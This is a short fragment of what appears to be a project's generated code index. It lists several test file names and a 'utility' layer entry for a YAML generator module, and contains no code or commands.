`tests/test_ops_loot_phase.py`, `tests/test_ops_loot_phase.py`, `tests/test_phase1_data_gaps.py`, `tests/test_world_model_extended.py`
 
 ## modules/yaml_generator.py
 - Layer: utility
